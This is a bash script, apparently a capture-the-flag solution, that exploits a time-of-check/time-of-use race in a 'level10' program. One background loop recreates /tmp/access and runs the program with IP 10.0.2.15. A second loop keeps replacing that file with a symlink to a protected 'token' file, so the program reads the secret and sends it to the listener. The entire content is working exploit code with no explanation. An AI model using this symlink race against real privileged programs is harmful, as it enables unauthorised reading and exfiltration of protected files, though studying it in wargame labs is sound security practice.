#!/bin/bash

while true
do
    rm -f /tmp/access
    touch /tmp/access
    ./level10 /tmp/access 10.0.2.15
done &

while true
do
    ln -sf /home/user/level10/token /tmp/access
done &